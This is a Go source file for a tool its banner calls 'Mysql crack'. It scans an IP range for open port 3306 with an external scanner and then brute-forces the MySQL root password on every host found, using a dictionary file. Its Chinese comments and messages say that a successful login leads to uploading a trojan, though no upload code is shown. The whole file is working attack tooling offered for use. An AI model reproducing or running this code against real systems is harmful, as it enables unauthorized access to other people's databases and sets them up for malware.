package main

import (
	"fmt"
	"github.com/ziutek/mymysql/mysql"
	_ "github.com/ziutek/mymysql/native" // Native engine
	"os"
	"os/exec"
	"time"
	"C"
	"io/ioutil"
	"strings"
	"runtime"
	"sync"
)

type ScanMysql struct {
	dist []string
	result map[string]string
}

//ScanPort
func (self *ScanMysql) ScanPort(startip, endip, port, thread string) {
	cmd := exec.Command(`s.exe`, `tcp`, startip, endip, port, thread, "/save")
	cmd.Stdout = os.Stdout
	if err := cmd.Run(); err != nil {
		fmt.Println("Error: ", err)
	}
	cmd.Run()
	fmt.Println("Scan success..")
}

func (slef *ScanMysql) crack(host, user, pass, port, dbname string) (bool, *mysql.Conn) {
	db := mysql.New("tcp", "", host+":"+port, user, pass, dbname)
	db.SetTimeout(4 * time.Second)
	err := db.Connect()
	if err != nil {
		db.Close()
		return false, nil
	}
	return true, &db
}
func (slef *ScanMysql) Attack(iparr []string){
	list := slef.dist
	var ip string
	ch := make(chan int)
	for _,ip = range(iparr){
		go slef.run(list,ip,ch)
	}
	<-ch
}

func (slef *ScanMysql)run(list []string,ip string,ch chan int) {
	var pass string
	wg := sync.WaitGroup{}
	for _,pass = range(list){
		wg.Add(1)
		go slef.run2(pass,ip,&wg)	
	}
	wg.Wait()
	ch<-1
	
}

func (slef *ScanMysql)run2(pass,ip string,wg *sync.WaitGroup){
	pass = strings.TrimSpace(pass)
	ip = strings.TrimSpace(ip)
	is_login,_ := slef.crack(ip,"root",pass,"3306","mysql")
	fmt.Printf("\r\nCracking: %s  root-%s",ip,pass)
	//爆破成功，上传木马执行
	if is_login{
		fmt.Println("  爆破成功，正在上传木马....\r\n")
		slef.result[ip] = pass
//		wg.Done()
//		os.Exit(2)
	} else {
		fmt.Println("  连接失败\r\n")
	}
	wg.Done()
}

func ( *ScanMysql) ipformat()[]string {
	f,err:= os.Open("Result.txt")
	if err !=nil{
		fmt.Println(err)
	}
	res,err := ioutil.ReadAll(f)
	if err !=nil{
		fmt.Println(err)
	}
	str := string(res)
	arr := strings.Split(str,"\r\n")
	l := len(arr)-4
	arrs := arr[2:l]
	var newarr []string
	for _,v := range(arrs){
		v = strings.Replace(v,"    3306  Open             ","",-1)
//		fmt.Println(i,v)
		newarr = append(newarr,v)	
	}
	f.Close()
	os.Remove("Result.txt")
	return newarr
}

func main() {
	runtime.GOMAXPROCS(runtime.NumCPU())
	fmt.Printf("\r\n------------------------------------------------------------------------------\r\n")
	fmt.Printf(" Welcome to use Mysql crack!                                     qq:1141056911\r\n")
	fmt.Printf("                                                                       By Lcy \r\n")
	fmt.Printf("                                                            http://phpinfo.me \r\n")
	fmt.Printf("------------------------------------------------------------------------------\r\n")
	if len(os.Args) != 4 {
		fmt.Printf("Usage: %s StartIP EndIP ThreadNumber", os.Args[0])
		os.Exit(1)
	}
	StartIP := os.Args[1]
	EndIP := os.Args[2]
	Thread := os.Args[3]
	fmt.Printf("Scaning to %s-%s\r\n",StartIP,EndIP)
	time.Sleep(1 * time.Second)
	//初始化mysql对像
	obj := ScanMysql{}
	obj.ScanPort(StartIP, EndIP, "3306", Thread)
	//开放3306端口的ip
	iparr := obj.ipformat()
	//读取字典文件
	f,err:= os.Open("pass.txt")
	if err !=nil{
		fmt.Println(err)
	}
	res,err := ioutil.ReadAll(f)
	if err !=nil{
		fmt.Println(err)
	}
	str := string(res)
	obj.dist = strings.Split(str,"\r\n")
	fmt.Printf("\r\nIP段扫描完毕，程序即将开始爆破密码...\r\n")
	time.Sleep(1 * time.Second)
	//启动线程开始爆破,爆破成功则自动上传木马
	obj.result = make(map[string]string)
	obj.Attack(iparr)
	//爆破结果
	for k,v := range(obj.result) {
		fmt.Printf("爆破成功: %s root-%s\r\n ",k,v)
	}
}
